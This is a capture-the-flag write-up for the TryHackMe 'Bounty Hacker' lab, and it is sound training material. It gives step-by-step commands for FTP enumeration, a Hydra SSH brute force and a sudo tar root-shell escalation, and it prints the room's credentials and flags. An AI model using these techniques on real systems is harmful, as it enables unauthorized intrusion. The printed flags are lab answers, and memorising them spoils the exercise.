# 🎯 Bounty Hacker - TryHackMe Writeup

## Objective

Compromise the target machine by performing service enumeration, discovering leaked credentials through FTP, gaining SSH access via brute force, escalating privileges, and retrieving both the user and root flags.

---

# Task 1 - Reconnaissance

The first step was to enumerate the target machine and identify the running services.

```bash
nmap -A -Pn -T5 <TARGET_IP>
```

### Scan Results

```text
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
```

Three services were discovered:

* FTP
* SSH
* HTTP

Since FTP was accessible, I decided to investigate it first.

---

# Task 2 - FTP Enumeration

Connect to the FTP service.

```bash
ftp <TARGET_IP>
```

The server allowed anonymous login without requiring a password.

After logging in, list the available files.

```bash
ls
```

Output:

```text
locks.txt
task.txt
```

Download both files.

```bash
get locks.txt
get task.txt
```

Exit FTP.

```bash
bye
```

---

## Reading task.txt

Display the contents.

```bash
cat task.txt
```

Output:

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

The signature at the bottom reveals the username.

### Answer

```text
lin
```

---

## Reading locks.txt

View the file.

```bash
cat locks.txt
```

The file contains multiple password candidates that can be used as a custom wordlist.

Since SSH is open, these passwords are likely intended for brute forcing.

---

# Task 3 - SSH Brute Force

Using the username discovered in **task.txt** and the passwords from **locks.txt**, perform a brute-force attack with Hydra.

```bash
hydra ssh://<TARGET_IP> -L task.txt -P locks.txt
```

Hydra successfully recovered the credentials.

### Credentials

```text
Username : lin
Password : RedDr4gonSynd1cat3
```

---

# Task 4 - Initial Access

Login to the target using SSH.

```bash
ssh lin@<TARGET_IP>
```

Enter the recovered password when prompted.

Once authenticated, a shell is obtained as the **lin** user.

---

# Task 5 - User Flag

List the files in the home directory.

```bash
ls
```

Locate the user flag.

```bash
cat user.txt
```

### User Flag

```text
THM{CR1M3_SyNd1C4T3}
```

---

# Task 6 - Privilege Escalation Enumeration

Check which commands can be executed with sudo privileges.

```bash
sudo -l
```

Output:

```text
(root) /bin/tar
```

The current user can execute **tar** as root without providing unrestricted root access.

---

# Task 7 - Privilege Escalation

Searching **GTFOBins** for the `tar` binary reveals a method to spawn a root shell.

Execute:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

A root shell is spawned.

Verify the privileges.

```bash
whoami
```

Output:

```text
root
```

---

# Task 8 - Root Flag

Navigate to the root directory.

```bash
cd /root
```

List the files.

```bash
ls
```

Read the root flag.

```bash
cat root.txt
```

### Root Flag

```text
THM{B0UNTY_h4cK3r}
```

---

# Commands Used

```bash
nmap -A -Pn -T5 <TARGET_IP>

ftp <TARGET_IP>

ls

get locks.txt

get task.txt

cat task.txt

cat locks.txt

hydra ssh://<TARGET_IP> -L task.txt -P locks.txt

ssh lin@<TARGET_IP>

cat user.txt

sudo -l

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

whoami

cd /root

cat root.txt
```

---

# Attack Path Summary

```text
Nmap Scan
      ↓
FTP Enumeration
      ↓
Anonymous Login
      ↓
Download task.txt & locks.txt
      ↓
Discover Username (lin)
      ↓
Use locks.txt as Password List
      ↓
Hydra SSH Brute Force
      ↓
SSH Login
      ↓
Retrieve User Flag
      ↓
sudo -l Enumeration
      ↓
GTFOBins (tar)
      ↓
Root Shell
      ↓
Retrieve Root Flag
```

---

# Key Takeaways

* Always enumerate every exposed service before exploitation.
* Anonymous FTP access can expose usernames, passwords, or internal documents.
* Custom wordlists found on the target are often useful for password attacks.
* Hydra is an effective tool for brute-forcing authentication services.
* Running `sudo -l` is an essential privilege escalation step.
* GTFOBins provides privilege escalation techniques for misconfigured binaries such as `tar`.

---

# Conclusion

Bounty Hacker is an excellent beginner-friendly room that demonstrates the importance of enumeration and privilege escalation. By combining information gathered from FTP with a targeted Hydra attack against SSH, initial access was obtained. A misconfigured sudo permission on the `tar` binary then allowed privilege escalation to root, leading to the successful retrieval of both flags.
